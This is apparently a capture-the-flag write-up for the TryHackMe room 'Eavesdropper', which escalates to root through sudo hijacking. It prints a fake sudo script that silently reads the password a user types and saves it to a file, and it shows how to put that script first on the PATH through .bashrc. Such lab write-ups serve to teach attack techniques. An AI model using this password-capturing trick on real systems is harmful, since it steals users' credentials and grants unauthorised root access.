# TryHackMe - Eavesdropper
![Room Logo](./img/logo.png)  
Room Link => [Eavesdropper](https://tryhackme.com/room/eavesdropper)  
#### There are two ways to solve this machine.
- Intended Way  
- Unintended Way  

#### You can follow the steps below to solve it using the intended way or you can check out another writeup by `xyro` who found an unintended way to solve this machine which is something very few people would have found and his approach to solve this machine is also unique. Link to his write is here => [Xyro's Writeup](http://xyro.codes/THM/eavesdropper/writeup.html)

## Intended way :
1. LogIn to the machine using `idrsa.id-rsa` provided in task 1 with username `frank`  
2. Transfer <code>pspy</code> onto the target machine and run it for a while.  
There are a few things we notice.  
User frank is logging in via ssh and then running the command `sudo cat /etc/shadow` We can perform <code>sudo hijacking</code> on this.  
3. Time for [sudo hijacking](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-hijacking)  
While creating our sudo executable, we have to be a little bit creative. Trying to get a reverse shell won't be useful. If u hijack sudo so that it spawns a reverse shell instead, the reverse shell u get back would be of the frank user because the sudo elevation hasn't happened yet. Instead we can capture the password entered by frank using a little bit of shell scripting. (Thanks you xyro for these words 😁).  

    Follow these steps to capture the password using our sudo executable.  
    1. `touch /tmp/sudo` creating our own sudo executable int tmp directory.  
    2. Content of sudo executable  
        ```
        #!/bin/bash  
        read -s pass # after executes the command, this will read the password entered by frank and store it in the pass variable  
        echo $pass > /home/frank/pass.txt # echoing the password from pass variable to pass.txt so that we can read it once catured.
        ```
    3. `chmod +x /tmp/sudo`  
    4. Modify you `$PATH` variable using `.bashrc`  
    ![bashrc](./img/bashrc.png)  
    Save the changes and wait for a few seconds after which you will see a pass.txt which has the password
    that can be used to switch to root.  
4. Copy the password from pass.txt and do `/usr/bin/sudo su` and get the root flag.

## Solved 😁
Once you are done with this.  
Make sure to ckeck out [Xyro's Writeup](http://xyro.codes/THM/eavesdropper/writeup.html)  
His method is super awesome 👍🏻